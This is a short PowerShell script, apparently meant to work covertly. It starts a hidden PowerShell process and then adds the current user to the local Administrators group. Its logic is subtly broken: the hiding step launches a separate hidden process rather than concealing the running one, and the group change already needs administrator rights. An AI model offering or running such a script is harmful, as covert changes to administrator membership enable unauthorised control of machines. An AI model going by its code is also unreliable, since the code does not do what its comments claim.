# Hide the PowerShell window
$si = New-Object System.Diagnostics.ProcessStartInfo
$si.FileName = "powershell.exe"
$si.WindowStyle = "Hidden"
[System.Diagnostics.Process]::Start($si)
# Get the current user's username
$currentuser = $env:USERNAME

# Add the current user to the Administrators group
Add-LocalGroupMember -Group "Administrators" -Member $currentuser -Verbose


